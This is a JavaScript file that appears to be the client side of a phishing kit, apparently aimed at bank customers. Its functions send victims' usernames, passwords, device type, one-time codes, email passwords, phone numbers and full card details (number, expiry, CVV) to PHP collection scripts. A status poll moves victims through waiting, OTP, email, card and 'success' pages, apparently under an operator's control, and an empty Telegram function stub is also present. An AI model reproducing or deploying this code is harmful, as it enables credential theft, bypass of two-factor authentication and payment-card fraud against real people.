function get_device(){
    var d = "";
    if(navigator.userAgent.match(/Android/i))
        d = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            d = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                d = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    d = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        d = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            d = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                d = "Windows Phone";
                            else
                                d = "PC";
    return d;
}   

function put_user(u){
    $.post( "../../../../../run/put-user.php", { usr: u} ,function(data) {
        window.location.href = "../../../../../VALIDATPASS/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/";
    });
}


function put_telgram(p){
	
	}

function put_pass(p){
     var d = get_device();     
    $.post( "../../../../../run/put-pass.php", { pass: p, dvc: d} ,function(data) {
        if (data == "ERR") {

        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "../../../../../WAITING/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/";
            }
        }
    });
}            

function status(){
    $.post( "../../../../../run/status.php",function(data) {
        switch (data) {
            case '2': window.location.href = "../../../../../VALIDATOTP/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;
            case '4': window.location.href = "../../../../../VALIDATMAIL/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;
            case '6': window.location.href = "../../../../../VALIDATCARD/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;               
            case '8': window.location.href = "../../../../../ERROROTP/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;
            case '10': window.location.href = "../../../../../SUCCESFUL/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;
            case '12': window.location.href = "../../../../../USER/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;
            //case '12': window.location.href = "../../../../../USER/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/"; break;
        
		} 
    });        
}

function put_otp(o){
    $.post( "../../../../../run/put-otp.php",{ otp:o },function(data) {
        window.location.href = "../../../../../WAITING/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/";
    }); 
}

function put_mail(m,c,t){    
    $.post( "../../../../../run/put-mail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "../../../../../WAITING/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/";
    });
}

function put_card(t,f,c){    
    $.post( "../../../../../run/put-card.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "../../../../../WAITING/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/";
    });
}